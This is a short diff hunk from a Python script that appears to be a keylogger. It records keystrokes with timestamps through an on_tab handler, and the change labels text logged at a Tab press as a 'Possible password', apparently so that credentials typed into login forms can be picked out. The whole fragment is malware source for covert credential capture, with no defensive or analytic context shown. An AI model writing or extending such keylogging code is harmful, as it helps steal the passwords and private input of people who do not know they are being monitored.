@@ -25,7 +25,7 @@ specials = [
 # Custom Functions to write dates
 def on_tab(key):
     try:
-        value = ',{0}\n'.format(datetime.now().strftime("%Y-%m-%d %H:%M:%S")[:-3])
+        value = ',{0}\n "Possible password"'.format(datetime.now().strftime("%Y-%m-%d %H:%M:%S")[:-3])
         keys.append(value)
         write_file(keys)
     except Exception as e:
